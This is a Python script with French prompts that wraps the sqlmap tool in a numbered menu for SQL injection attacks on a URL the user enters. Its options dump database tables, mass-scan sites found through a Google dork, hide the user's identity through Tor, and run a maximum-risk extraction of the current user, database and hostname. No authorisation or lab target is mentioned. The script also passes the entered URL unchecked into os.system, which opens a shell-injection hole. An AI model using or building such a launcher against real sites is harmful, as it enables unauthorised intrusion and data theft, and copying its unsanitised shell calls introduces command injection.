import os

# Demander à l'utilisateur d'entrer un site à tester pour l'injection SQL
site = input("Entrez l'URL à tester pour l'injection SQL: ")

# Options disponibles avec description
options = {
    '1': 'Exécuter un test d\'injection SQL sur le site spécifié par l\'utilisateur',
    '2': 'Automatiser le processus de test en utilisant un fichier d\'enregistrement',
    '3': 'Extraire des données de la base de données cible',
    '4': 'Automatiser le processus de test en utilisant Google Dork',
    '5': 'Utiliser le réseau Tor pour protéger l\'identité de l\'utilisateur',
    '6': 'S\'authentifier avec un nom d\'utilisateur et un mot de passe spécifiques',
    '7': 'Automatiser le processus de test en utilisant une liste d\'URL',
    '8': 'Utiliser une connexion SSL pour chiffrer les communications',
    '9': 'Utiliser un proxy pour effectuer des requêtes HTTP',
    '10': 'Utiliser plusieurs threads pour accélérer le processus de test',
    '11': 'Utiliser toutes les options disponibles pour effectuer un test complet d\'injection SQL'
}

# Afficher les options disponibles avec description
print("Options disponibles:")
for key, value in options.items():
    print(key + ". " + value)

# Demander à l'utilisateur de choisir une option
option = input("Entrez le numéro de l'option à utiliser: ")

# Exécuter l'option sélectionnée
if option in options:
    if option == '1':
        os.system(f'sqlmap -u "{site}" --batch')
    elif option == '2':
        os.system(f'sqlmap -r request.txt --batch')
    elif option == '3':
        os.system(f'sqlmap -D dbname -T tablename -C columnname --dump')
    elif option == '4':
        os.system(f'sqlmap -g "inurl:index.php?id=" --batch')
    elif option == '5':
        os.system(f'sqlmap -u "{site}" --tor')
    elif option == '6':
        os.system(f'sqlmap -u "{site}" --auth-type="BASIC" --auth-cred="user:password" --batch')
    elif option == '7':
        os.system(f'sqlmap -m urls.txt --batch')
    elif option == '8':
        os.system(f'sqlmap -u "{site}" --ssl --ignore-ssl-errors')
    elif option == '9':
        os.system(f'sqlmap -u "{site}" --proxy="http://127.0.0.1:8080" --batch')
    elif option == '10':
        os.system(f'sqlmap -u "{site}" --threads=5 --batch')
    elif option == '11':
        os.system(f'sqlmap -u "{site}" --level=5 --risk=3 --cookie="user=admin;password=pass" --dbms="MySQL" --os="Linux" --current-user --current-db --hostname --timeout=10 --fresh-queries --hex --output-format="csv" --batch')
else:
    print("Option invalide")
